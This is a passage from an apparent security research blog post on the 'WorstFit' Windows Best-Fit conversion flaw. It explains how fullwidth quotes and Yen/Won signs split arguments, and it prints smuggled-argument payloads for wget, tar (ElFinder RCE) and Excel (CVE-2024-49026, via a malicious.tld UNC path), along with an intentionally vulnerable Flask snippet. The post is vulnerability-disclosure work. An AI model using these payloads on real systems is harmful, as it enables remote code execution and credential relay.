&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/fetch&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wget&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://example.tld/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Done&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, is this wget’s problem? Well, spoiler alert: yes, it’s part of the issue, but it doesn’t stop there. The same trick works on other executables like &lt;strong&gt;openssl.exe&lt;/strong&gt;, &lt;strong&gt;tar.exe&lt;/strong&gt;, &lt;strong&gt;java.exe&lt;/strong&gt;, and more CLI tools. This makes us realize, this can actually be a broader systemic issue with how argument handling works on Windows, creating an attack surface across various tools. So, how does it happen?&lt;/p&gt;

&lt;p&gt;Let’s back to our payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＂ --use-askpass=calc ＂&lt;/code&gt;. I guess now some of you might still be wondering: &lt;em&gt;Wait, how does a simple double quote bypass the escaping? What exactly does it escape, then?&lt;/em&gt; Well, first of all, these aren’t just regular double quotes (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+0022&lt;/code&gt;) — they’re actually &lt;strong&gt;fullwidth double quotes&lt;/strong&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) 😉. Thanks to the Best-Fit feature, in code pages like 125x and 874, fullwidth double quotes are automatically converted into standard double quotes (&lt;a href=&quot;https://worst.fit/mapping/#from%3A0xFF02%20to%3A0x22&quot;&gt;🔍&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;But still, why can these double quotes alter the arguments?&lt;/p&gt;

&lt;p&gt;Firstly, on Windows, the &lt;strong&gt;entire command line&lt;/strong&gt; is passed as a single string to the spawned process, leaving it up to the executable to parse. That’s why the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw&quot;&gt;CreateProcess API&lt;/a&gt; accepts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lpCommandLine&lt;/code&gt; parameter directly. This differs from UNIX-like systems, where arguments are always passed as an array of strings. For a more detailed explanation of argument parsing on Windows, check out &lt;a href=&quot;https://daviddeley.com/autohotkey/parameters/parameters.htm#WIN&quot;&gt;this article&lt;/a&gt; by David Deley.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Secondly, because the command line string is stored internally in wide character (Unicode) format, retrieving its ANSI string version involves Windows using the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;&lt;/a&gt; API.  Which of course the Best-Fit feature is applied during this process, potentially altering the command line in subtle but impactful ways.&lt;/p&gt;

&lt;p&gt;But actually, there isn’t a single “standard” way to parse the command line on Windows. However, the parsing convention typically adheres to the rules of &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-commandlinetoargvw&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommandLineToArgvW&lt;/code&gt;&lt;/a&gt; or &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/cpp/main-function-command-line-args#parsing-c-command-line-arguments&quot;&gt;CRT command-line parsing&lt;/a&gt;. In practice, most developers use either &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommandLineToArgvW&lt;/code&gt; or CRT standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main(...)&lt;/code&gt; to handle command-line arguments, so I’d say we can pretty much treat this as the standard. The key characters involved in the parsing process include:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Tabs (0x09) and spaces (0x20)&lt;/strong&gt;: Used to separate arguments (except when in quote mode).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; (0x22)&lt;/strong&gt;: Toggles the quote mode to treat spaces as part of the argument.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; (0x5C)&lt;/strong&gt;: Escapes double quotes and backslashes when used in a specific sequence.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These conventions form the foundation of how arguments are interpreted and passed to executables.&lt;/p&gt;

&lt;p&gt;Therefore, standard libraries and functions in most programming languages adhere to these parsing rules to sanitize user-provided arguments.  For instance, in &lt;strong&gt;PHP&lt;/strong&gt;, the &lt;a href=&quot;https://www.php.net/manual/en/function.escapeshellarg.php&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escapeshellarg&lt;/code&gt;&lt;/a&gt; function replaces double quotes with spaces, wraps the argument in quotes, and escapes backslashes as needed to ensure safe execution in the shell.  Similarly, in &lt;strong&gt;Python&lt;/strong&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module internally uses the &lt;a href=&quot;https://github.com/python/cpython/blob/v3.12.8/Lib/subprocess.py#L576&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list2cmdline&lt;/code&gt;&lt;/a&gt; function to convert a Python list into a command line string, escaping arguments strictly according to the Microsoft CRT command-line parsing logic.&lt;/p&gt;

&lt;p&gt;However, all of this escaping happens before the Best-Fit feature comes into play. This means that even carefully escaped arguments can still be altered during the ANSI conversion process.&lt;/p&gt;

&lt;p&gt;Here’s a simple example. Using the example Python code we provided, let’s examine what happens when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget.exe&lt;/code&gt; is spawned with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module. The entire argument parsing process would look something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we saw, fullwidth quotation marks (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) are transformed into regular double quotes (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+0022&lt;/code&gt;) during the Best-Fit conversion process. This subtle alteration changes the original command-line syntax, enabling argument-splitting behavior.&lt;/p&gt;

&lt;p&gt;Furthermore, even programs that don’t directly use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt; can still be vulnerable to this attack if they rely on the non-Unicode version of the main function. Yes, we’re talking about the &lt;strong&gt;innocent-looking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt;&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;Here we can do a small experiment. Given this piece of code&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;argv[%d] = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, when we run the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.\test.exe &quot;foo＂ ＂bar&quot;&lt;/code&gt;, it does produce two arguments, as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And yes, Python’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module can’t prevent this. Even if the entire string is passed as a single list element, it still ends up being parsed into two separate arguments.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The reason a normal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function becomes vulnerable lies in how the &lt;strong&gt;C runtime (CRT)&lt;/strong&gt; handles command-line arguments.  Even if you don’t explicitly call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;, once you use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt; function, the compiler secretly generates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mainCRTStartup&lt;/code&gt; function inside your binary for you. This startup function is linked to the C runtime library (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ucrtbase.dll&lt;/code&gt;), which internally retrieves the command line using an ANSI API and parses it for you. And that’s where the vulnerability creeps in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is why so many executables are exposed to WorstFit vulnerabilities. Worse still, as the attack exploits behavior at the system level during the conversion process, &lt;strong&gt;no standard library in any programming language can fully stop our attack!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;However, only on 125x and 874 code pages does the fullwidth quotation mark (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) get converted into a normal double quote. So, what about CJK (Chinese, Japanese and Korean) languages? Are they safe now? Not entirely. Double quote is NOT the only character we can use for this attack!&lt;/p&gt;

&lt;p&gt;As mentioned in the &lt;strong&gt;Filename Smuggling&lt;/strong&gt; section, the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00A5&lt;/code&gt;) on the Japanese (932) code page and the Won sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+20A9&lt;/code&gt;) on the Korean (949) code page are both converted into a &lt;strong&gt;backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;)&lt;/strong&gt;. And what can a backslash do? Quite a lot! As we’ve discussed, the backslash is crucial for escaping characters and altering the syntax of a command line. This means it can be exploited to manipulate command execution.&lt;/p&gt;

&lt;p&gt;Let’s take this Python code as an example:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;vuln.exe&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;foo¥&quot; bar&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here, Python handles escaping for us – in this case, escaping the double quote. After escaping, the command line should look like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuln.exe &quot;foo¥\&quot; bar&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Python prepends a backslash before the double quote to escape it. Everything seems fine, so Python passes this command line to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateProcessW&lt;/code&gt; API, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; spawns successfully. Great!&lt;/p&gt;

&lt;p&gt;However, here’s where it gets tricky. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; program uses an &lt;strong&gt;ANSI API&lt;/strong&gt; to retrieve the command line. Thanks to the Best-Fit feature (again 😜), the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¥&lt;/code&gt;) is converted into a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;). Now, the command line seen by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; becomes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuln.exe &quot;foo\\&quot; bar&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The backslash added by Python is now escaped by the “ex-Yen-sign”. As a result, that double quote is no longer properly escaped, allowing it to act as a delimiter. The arguments for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; are now split into two parts: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo\&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bar&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note&lt;/strong&gt;: Of course, characters that can be converted into spaces or tabs can also be exploited for argument splitting. I’ll leave this part as an exercise for you 😉.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Now, we already explored most of the possible ways to exploit WorstFit for argument splitting. Let’s dive into some real-world exploits and see this attack in action!&lt;/p&gt;

&lt;h4 id=&quot;-case-study-1---elfinder-rce-w-windows-built-in-gnu-tar&quot;&gt;➤ Case Study 1 - ElFinder: RCE w/ Windows built-in GNU Tar&lt;/h4&gt;

&lt;p&gt;Here, one of our case studies highlights an RCE (Remote Code Execution) attack on &lt;a href=&quot;https://github.com/Studio-42/elFinder&quot;&gt;&lt;strong&gt;ElFinder&lt;/strong&gt;&lt;/a&gt;, caused by the WorstFit vulnerability in Windows’ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command.&lt;/p&gt;

&lt;p&gt;ElFinder is a popular open-source, web-based file manager with a PHP backend. By default, it supports Windows servers and comes with a built-in feature for creating and extracting archives, which is also enabled by default.&lt;/p&gt;

&lt;p&gt;The way it handles archive formats is straightforward—it directly executes shell commands.  Sounds risky? Perhaps. But the developers have taken precautions by escaping all arguments properly using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escapeshellarg&lt;/code&gt; (&lt;a href=&quot;https://github.com/Studio-42/elFinder/blob/7544918a2ba656a4fe72a6fc8bb502d39f601cda/php/elFinderVolumeDriver.class.php#L6898-L6911&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php/elFinderVolumeDriver.class.php#L6898-L6911&lt;/code&gt;&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despite this effort, escaping at the application level might not fully mitigate risks if quirks like the Best-Fit feature in Windows are involved.&lt;/p&gt;

&lt;p&gt;One of the archive formats supported by ElFinder is the &lt;strong&gt;tar&lt;/strong&gt; format. It uses the system’s built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command to create or extract archives. For example, if we create an archive named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foobar.tar&lt;/code&gt; containing the files &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo.txt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bar.txt&lt;/code&gt;, ElFinder would just execute the following command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe -chf &quot;foobar.tar&quot; &quot;.\foo.txt&quot; &quot;.\bar.txt&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;However, we discovered that the Windows built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command is vulnerable to the &lt;strong&gt;WorstFit&lt;/strong&gt; attack! This means that if you can control even a small part of an argument, it’s possible to execute arbitrary commands. For details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/tar/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;To exploit this, we can simply name the tar file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa＂ ＂--use-compress-program=calc＂ ＂bbb.tar&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＂&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;). This injects the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--use-compress-program&lt;/code&gt; parameter, which allows arbitrary command execution. In our demonstration, this results in popping up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt;.&lt;/p&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/DPIp42-Ls0U?si=dczou7dD-p4CSOQ9&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;blockquote&gt;
  &lt;p&gt;In this demonstration, we use an English-configured Windows server (Code Page 1252) as an example. This technique should also work on other 125x code pages and Code Page 874 configurations.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;-case-study-2---all-the-ways-to-code-execution&quot;&gt;➤ Case Study 2+ - All the Ways to Code Execution&lt;/h4&gt;

&lt;p&gt;Of course, there are more applications are indirectly exposed to WorstFit vulnerabilities because they invoke other executables that are themselves vulnerable to this. Here we demonstrate two examples:&lt;/p&gt;

&lt;p&gt;The first one involves a modified version of plink.exe used in &lt;strong&gt;TortoiseGit&lt;/strong&gt;. When a user enters a malicious URI for cloning, it can trigger code execution. For details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/plink/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EF1U-C0e_9E?si=oEKebidfQ1hRIead&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;The second example involves &lt;strong&gt;RStudio&lt;/strong&gt;, which supports version control with SVN. If an SVN project is placed in a maliciously crafted folder, a single click can trigger a calculator to pop up on the user’s machine! For more details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/SVN/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/YKw4ZcQ75Hc?si=Gd6pZ7r4wLToX15m&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;-case-study-3---microsoft-excel-remote-code-execution-cve-2024-49026&quot;&gt;➤ Case Study 3 - Microsoft Excel Remote Code Execution &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026&quot;&gt;CVE-2024-49026&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;While re-mounting Argument Injection to applications, we discovered that the Argument Splitting attack can be combined with the “Open-With” feature to escalate its impact!&lt;/p&gt;

&lt;p&gt;Windows actually maintains a handler table to know which program to use to open a file when you double-click a file. You can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftype&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;assoc&lt;/code&gt; to see which programs handle specific file extensions. The filename would also become part of the argument, which means we can apply our attack through that!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We then discovered that the executable of Microsoft Excel is vulnerable to the Argument Splitting attack. We can just rename the Excel file to the following name - translating all dots, (back-)slashes, and double quote to their fullwidth forms.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;．．／．．／．．／Windows／win.ini＂ ／n ＂＼＼malicious.tld@80＼pwn.xlsx&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;By combining two tricks, we can trigger an Argument Injection on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Excel.exe&lt;/code&gt; with just 1-Click. Since Excel itself &lt;a href=&quot;https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6#Category=Excel&quot;&gt;doesn’t have any good argument&lt;/a&gt; for further exploitation, we only use NTLM Relay along with RBCD/ADCS to achieve RCE!&lt;/p&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/zklkmbDyR1U?si=dLfxuwaO5U2En20n&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;em&gt;P.S. if you find a better argument that can directly lead to RCE, please let us know!&lt;/em&gt; 🙂&lt;/p&gt;

&lt;h3 id=&quot;-environment-variable-confusion&quot;&gt;🔥 Environment Variable Confusion&lt;/h3&gt;

&lt;p&gt;When functions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentStringsA&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *getenv(const char *varname)&lt;/code&gt; are used, they return the &lt;strong&gt;Best-Fit&lt;/strong&gt; version of the environment variable. This subtle behavior can be exploited to bypass character restrictions, creating potential opportunities for attackers to slip through otherwise secure validations and introduce security vulnerabilities.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *getenv(const char *varname)&lt;/code&gt;&lt;/a&gt;&lt;br /&gt;
&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: No specific&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: No specific (for Apache HTTPd: 0x00-0xFF)&lt;/p&gt;

